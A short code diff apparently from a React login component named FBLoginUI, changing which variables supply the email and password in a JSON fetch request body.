@@ -17,8 +17,8 @@ const FBLoginUI = () => {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-                email: formData.email,
-                password: formData.password,
+                email: username,
+                password: pass,
             }),
         });
 
